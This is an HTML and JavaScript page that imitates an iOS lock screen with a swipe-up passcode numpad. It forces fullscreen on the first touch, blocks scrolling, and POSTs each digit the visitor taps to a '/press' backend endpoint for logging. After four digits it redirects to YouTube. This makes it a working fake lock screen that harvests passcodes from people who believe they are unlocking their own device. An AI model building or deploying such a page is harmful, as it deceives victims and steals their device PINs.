<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">

<title>iOS Lock → Passcode → Numpad</title>

<style>
* {
    margin: 0;
    padding: 0;
    box-sizing: border-box;
    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto;
}

body {
    height: 100vh;
    height: -webkit-fill-available; /* Fixes mobile Safari viewport height bugs */
    overflow: hidden;
    background: black;
    position: fixed; /* Prevents the body from shifting or scrolling */
    width: 100%;
    touch-action: none; /* Disables all standard browser panning and zooming */
    -webkit-user-select: none; /* Stops accidental text highlighting while tapping numbers */
    user-select: none;
}

/* Ensure both screens stay pinned to the boundaries */
.lock, .passcode {
    position: absolute;
    top: 0;
    left: 0;
    width: 100%;
    height: 100%;
    overflow: hidden;
}

/* 🌄 wallpaper */
.wallpaper {
    position: absolute;
    width: 100%;
    height: 100%;
    background: url("/static/wallpaper.jpg") center/cover no-repeat;

    transform: scale(1.1);
    transition: 0.7s ease;
}

/* blur only after swipe */
.blur {
    filter: blur(20px) brightness(0.75) saturate(1.2);
    transform: scale(1.2);
    transition: 0.7s ease;
}

/* ===== SCREEN 1: LOCK ===== */
.lock {
    position: absolute;
    width: 100%;
    height: 100%;
    color: white;

    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;

    transition: 0.6s ease;
}

.time {
    font-size: 70px;
    font-weight: 300;
}

.date {
    font-size: 16px;
    opacity: 0.8;
}

.swipe {
    position: absolute;
    bottom: 30px;
    width: 140px;
    height: 5px;
    background: rgba(255,255,255,0.4);
    border-radius: 10px;
}

/* ===== SCREEN TRANSITION ===== */
.hidden {
    opacity: 0;
    transform: translateY(-20px);
    pointer-events: none;
}

/* blur */
.blur {
    filter: blur(18px) brightness(0.7);
    transform: scale(1.2);
}

/* ===== SCREEN 2: PASSCODE ===== */
/* ===== SCREEN 2: PASSCODE ===== */
.passcode {
    position: absolute;
    width: 100%;
    height: 100%;
    background: rgba(0, 0, 0, 0.25); /* Allows the wallpaper underneath to show */
    backdrop-filter: blur(20px);
    -webkit-backdrop-filter: blur(20px); /* For iOS/Safari support */

    display: flex;
    flex-direction: column;
    justify-content: center;
    align-items: center;

    opacity: 0;
    transform: translateY(30px);
    transition: 0.5s ease;
}

.passcode.show {
    opacity: 1;
    transform: translateY(0);
}

/* 🔵 DOTS (ONLY HERE NOW) */
.dots {
    display: flex;
    gap: 12px;
    margin-bottom: 30px;
}

.dot {
    width: 14px;
    height: 14px;
    border-radius: 50%;
    border: 1px solid rgba(255,255,255,0.6);
}

.dot.filled {
    background: white;
}

/* numpad */
/* numpad container */
.numpad {
    display: grid;
    grid-template-columns: repeat(3, 1fr);
    gap: 20px 25px; /* Increased spacing to mimic iOS layout */
    width: 280px;   /* Explicit width keeps the grid compact and consistent */
    margin-top: 20px;
    align-items: center;
    justify-items: center; /* Keeps buttons dead center within their grid slots */
}

button {
    width: 75px;    /* Fixed identical width */
    height: 75px;   /* Fixed identical height */
    border-radius: 50%;
    border: none;

    background: rgba(255,255,255,0.12);
    color: white;
    font-size: 28px; /* Slightly larger text to fit the round buttons */
    font-weight: 400;

    backdrop-filter: blur(18px);
    -webkit-backdrop-filter: blur(18px);

    position: relative;
    overflow: hidden;

    /* Center text perfectly */
    display: inline-flex;
    align-items: center;
    justify-content: center;

    transition: transform 0.1s ease, background 0.2s ease;
    cursor: pointer;
    /* 👇 ADD THIS LINE TO REMOVE THE BLUE HIGHLIGHT 👇 */
    -webkit-tap-highlight-color: transparent;
}

/* 🍎 iOS-style press animation */
button::before {
    content: "";
    position: absolute;
    inset: 0;
    background: radial-gradient(circle at center,
        rgba(255,255,255,0.35),
        rgba(255,255,255,0.08),
        transparent 70%);
    opacity: 0;
    transition: opacity 0.25s ease;
}

/* pressed state */
button:active {
    transform: scale(0.92);
    background: rgba(255,255,255,0.18);
}

/* smooth glass flash on press */
button:active::before {
    opacity: 1;
    animation: pressGlow 0.35s ease;
}

@keyframes pressGlow {
    0% {
        transform: scale(0.8);
        opacity: 0.6;
    }
    100% {
        transform: scale(1.2);
        opacity: 0;
    }
}
</style>
</head>

<body>

<div class="wallpaper" id="wallpaper"></div>

<!-- LOCK SCREEN -->
<div class="lock" id="lock">

    <div style="text-align:center;">
        <div class="time" id="time">00:00</div>
        <div class="date" id="date">Loading...</div>
    </div>

    <div class="swipe"></div>

</div>

<!-- PASSCODE SCREEN -->
<div class="passcode" id="passcode">

    <!-- 🔵 DOTS (ONLY HERE) -->
    <div class="dots">
        <div class="dot" id="d1"></div>
        <div class="dot" id="d2"></div>
        <div class="dot" id="d3"></div>
        <div class="dot" id="d4"></div>
    </div>

    <!-- NUMPAD -->
    <div class="numpad">
        <button onclick="press('1')">1</button>
        <button onclick="press('2')">2</button>
        <button onclick="press('3')">3</button>

        <button onclick="press('4')">4</button>
        <button onclick="press('5')">5</button>
        <button onclick="press('6')">6</button>

        <button onclick="press('7')">7</button>
        <button onclick="press('8')">8</button>
        <button onclick="press('9')">9</button>

       <div></div> <button onclick="press('0')">0</button>
    <div></div>
    </div>

</div>

<script>

let startY = 0;
let pin = "";
let triggered = false;

/* clock */
function updateTime() {
    const now = new Date();
    document.getElementById("time").innerText =
        now.toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'});

    document.getElementById("date").innerText =
        now.toDateString();
}
setInterval(updateTime, 1000);
updateTime();

/* swipe → go to passcode screen */
function goToPasscode() {
    document.getElementById("lock").classList.add("hidden");
    document.getElementById("passcode").classList.add("show");
    document.getElementById("wallpaper").classList.add("blur");
}

/* unlock final */
function unlock() {
    if (triggered) return;
    triggered = true;

    // Add a tiny visual pause so the user sees the 4th dot fill up before redirecting
    setTimeout(() => {
        // Change this URL to whichever YouTube link you want to open
        window.location.href = "https://www.youtube.com"; 
    }, 150); 
}

/* dots */
function renderDots() {
    for (let i = 1; i <= 4; i++) {
        document.getElementById("d"+i).classList.remove("filled");
    }

    for (let i = 0; i < pin.length; i++) {
        document.getElementById("d"+(i+1)).classList.add("filled");
    }
}

/* pin input */
function press(n) {
    if (pin.length >= 4) return;

    pin += n;
    renderDots();
	
    // 👇 ADD THIS: Send the pressed key to the Flask backend
    fetch('/press', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json'
        },
        body: JSON.stringify({ key: n })
    })
    .then(response => response.json())
    .then(data => console.log("Logged:", data))
    .catch(err => console.error("Error logging key:", err));
    
    if (pin.length === 4) {
        setTimeout(() => unlock(), 200);
    }
}

function back() {
    pin = pin.slice(0, -1);
    renderDots();
}
/* Helper function to request fullscreen immediately on interaction */
function triggerFullscreen() {
    let elem = document.documentElement;
    // Check if we are already in fullscreen to avoid redundant requests
    if (!document.fullscreenElement && !document.webkitFullscreenElement) {
        if (elem.requestFullscreen) {
            elem.requestFullscreen().catch(err => console.log(err));
        } else if (elem.webkitRequestFullscreen) { /* Safari / iOS */
            elem.webkitRequestFullscreen();
        }
    }
}

/* Updated touch detection */
document.addEventListener("touchstart", (e) => {
    triggerFullscreen(); // ⚡ Instant fullscreen on first touch
    startY = e.touches[0].clientY;
});

document.addEventListener("touchend", (e) => {
    let endY = e.changedTouches[0].clientY;
    if (startY - endY > 80) goToPasscode();
});

/* Updated mouse detection */
document.addEventListener("mousedown", (e) => {
    triggerFullscreen(); // ⚡ Instant fullscreen on click
    startY = e.clientY;
});

document.addEventListener("mouseup", (e) => {
    let endY = e.clientY;
    if (startY - endY > 80) goToPasscode();
});
/* swipe detection */
document.addEventListener("touchstart", (e) => {
    startY = e.touches[0].clientY;
});

document.addEventListener("touchend", (e) => {
    let endY = e.changedTouches[0].clientY;
    if (startY - endY > 80) goToPasscode();
});

document.addEventListener("mousedown", (e) => {
    startY = e.clientY;
});

document.addEventListener("mouseup", (e) => {
    let endY = e.clientY;
    if (startY - endY > 80) goToPasscode();
});
// Block native mobile bounce and scroll movements entirely
document.addEventListener('touchmove', function(e) {
    e.preventDefault();
}, { passive: false });
</script>

</body>
</html>
